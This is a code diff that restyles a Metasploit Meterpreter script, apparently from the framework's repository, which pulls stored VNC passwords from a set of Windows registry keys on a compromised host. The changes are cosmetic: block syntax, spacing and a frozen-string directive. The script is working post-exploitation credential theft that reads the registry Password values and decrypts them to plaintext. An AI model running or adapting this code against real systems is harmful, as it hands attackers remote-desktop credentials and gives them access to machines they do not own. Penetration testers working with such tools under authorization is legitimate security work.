@@ -1,10 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
-
 
 #----------------------------------------------------------------
 # Meterpreter script to obtain the VNC password out of the
@@ -27,7 +26,7 @@ session = client
   "-l" => [ false, "List default key locations"]
 )
 
-def usage()
+def usage
   print("\nPull the VNC Password from a Windows Meterpreter session\n")
   print("By default an internal list of keys will be searched.\n\n")
   print("\t-k\tSpecific key to search (e.g. HKLM\\\\Software\\\\ORL\\\\WinVNC3\\\\Default)\n")
@@ -37,7 +36,7 @@ end
 
 def get_vncpw(session, key)
   root_key, base_key = session.sys.registry.splitkey(key)
-  open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)
+  open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
   begin
     return open_key.query_value('Password')
   rescue
@@ -49,9 +48,9 @@ end
 def listkeylocations(keys)
   print_line("\nVNC Registry Key Locations")
   print_line("--------------------------\n")
-  keys.each { |key|
+  keys.each do |key|
     print_line("\t#{key}")
-  }
+  end
   completed
 end
 
@@ -64,14 +63,14 @@ keys = [
   'HKLM\\Software\\ORL\\WinVNC3\\Default', 'HKCU\\Software\\ORL\\WinVNC3\\Default',
   'HKLM\\Software\\ORL\\WinVNC\\Default', 'HKCU\\Software\\ORL\\WinVNC\\Default',
   'HKLM\\Software\\RealVNC\\WinVNC4', 'HKCU\\Software\\RealVNC\\WinVNC4',
-  'HKLM\\Software\\RealVNC\\Default', 'HKCU\\Software\\RealVNC\\Default',
+  'HKLM\\Software\\RealVNC\\Default', 'HKCU\\Software\\RealVNC\\Default'
 ]
 
 # parse the command line
 listkeylocs = false
 keytosearch = nil
 
-@@exec_opts.parse(args) { |opt, idx, val|
+@@exec_opts.parse(args) do |opt, _idx, val|
   case opt
   when "-h"
     usage
@@ -80,29 +79,28 @@ keytosearch = nil
   when "-k"
     keytosearch = val
   end
-}
+end
 if client.platform =~ /win32|win64/
-if keytosearch == nil
-  print_status("Searching for VNC Passwords in the registry....")
-  keys.each { |key|
-    vncpw = get_vncpw(session, key)
-    if vncpw
+  if keytosearch.nil?
+    print_status("Searching for VNC Passwords in the registry....")
+    keys.each do |key|
+      vncpw = get_vncpw(session, key)
+      next unless vncpw
       vncpw_hextext = vncpw.data.unpack("H*").to_s
       vncpw_text = Rex::Proto::RFB::Cipher.decrypt vncpw.data, fixedkey
       print_status("FOUND in #{key} -=> #{vncpw_hextext} => #{vncpw_text}")
     end
-  }
-else
-  print_status("Searching in regkey: #{keytosearch}")
-  vncpw = get_vncpw(session, keytosearch)
-  if vncpw
-    vncpw_hextext = vncpw.data.unpack("H*").to_s
-    vncpw_text = Rex::Proto::RFB::Cipher.decrypt vncpw.data, fixedkey
-    print_status("FOUND in #{keytosearch} -=> #{vncpw_hextext} => #{vncpw_text}")
   else
-    print_status("Not found")
+    print_status("Searching in regkey: #{keytosearch}")
+    vncpw = get_vncpw(session, keytosearch)
+    if vncpw
+      vncpw_hextext = vncpw.data.unpack("H*").to_s
+      vncpw_text = Rex::Proto::RFB::Cipher.decrypt vncpw.data, fixedkey
+      print_status("FOUND in #{keytosearch} -=> #{vncpw_hextext} => #{vncpw_text}")
+    else
+      print_status("Not found")
+    end
   end
-end
 else
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
